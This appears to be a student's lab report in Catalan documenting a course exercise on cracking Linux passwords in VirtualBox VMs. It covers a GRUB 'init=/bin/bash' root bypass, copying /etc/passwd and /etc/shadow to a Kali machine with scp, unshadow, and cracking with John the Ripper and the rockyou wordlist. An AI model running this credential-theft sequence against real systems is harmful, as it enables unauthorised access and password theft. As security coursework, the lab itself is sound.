# NF1AA3-Activitat-Cracking-de-contrasenyes


## Activitat

En aquesta activitat he iniciat el procés de recuperació de contrasenyes a una màquina Ubuntu, utilitzant el menú GRUB per accedir com a root.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2015_18_25-LinuxPasswords%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

En aquesta pantalla he editat l'entrada d'arrencada d'Ubuntu des de GRUB per iniciar una shell de root.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2015_19_01-LinuxPasswords%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
rw init=/bin/bash
```

Després de posar aquesta comanda he pugut accedeir com root en la maquina victima

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2015_23_08-LinuxPasswords%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)



A Kali Linux he instal·lat John the Ripper i la interfície gràfica Johnny, necessaris per provar la recuperació de contrasenyes.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2015_52_05-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
sudo apt install john johnny
```

En aquesta camptura es mostra la ip de la maquina kali
![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2015_50_24-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
ip a
```

He copiat els fitxers /etc/passwd i /etc/shadow de la màquina Ubuntu a Kali.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_10_24-LinuxPasswords%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
scp /etc/passwd kali@10.0.2.15:.
scp /etc/shadow kali@10.0.2.15:.
```

He combinat els fitxers `passwd` i `shadow` en un únic fitxer perquè John the Ripper pugui analitzar els hashes.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-13%2015_47_04-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
unshadow passwd shadow > passwords-aitorflamarich
```



He obert Johnny.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_11_21-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
johnny
```

He obert el johnny per començar a fer l'atac


![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_11_32-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)



En aquesta captura he buscar el archiu passwords-aitorflamarich

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_12_20-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)



En aquesta captura es veu el fitxer de contrasenyes carregat a Johnny i els comptes detectats.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_19_08-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)



La interfície de Johnny mostra els resultats de les contrasenyes que s'han pogut recuperar, que es la de gru

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_19_51-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)



He descomprimit el diccionari rockyou.txt per poder-lo utilitzar i conseguir més contrasenyes.

![](//NF1AA3-Activitat-Cracking-de-contrasenyesImg/2026-10-08%2017_41_20-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

A Johnny es mostren més resultats obtinguts durant les proves de recuperació de contrasenyes.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_54_25-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)


He cambiat el diccionari que te que utiliztar per l'atac i he posat el rockyou.txt y despres he cambiat el format per crypt.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-08%2017_55_17-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)



A Johnny es veuen 5 contraseñes que s'han pogut recuperar, l'unica que queda es la de scarlet

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-13%2015_48_02-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)



Finalment, he executat John the Ripper amb el format crypt i el mode incremental per poder aconseguir la contrasenya de scarlet.

![](/NF1AA3-Activitat-Cracking-de-contrasenyes/Img/2026-10-13%2016_09_01-kali-linux-2026.2-virtualbox-amd64%20[S'està%20executant]%20-%20Oracle%20VirtualBox.png)

```bash
john --format=crypt --incremental passwords-aitorflamarich
```
## Comentari
Despres de fer tot aixo no s'ha pogut aconseguri la contrasenya de scarlet.

## Objetiu de la activitat
L’objectiu d’aquesta activitat és aprendre a recuperar/robar contrasenyes i els usuaris d'un sistema Linux mitjançant l’accés com a root, i poder pasarles a un altre sistema, i tambe ens ha ensenyat a utilizar eines com John Johnny per poder crakear contrasenyes.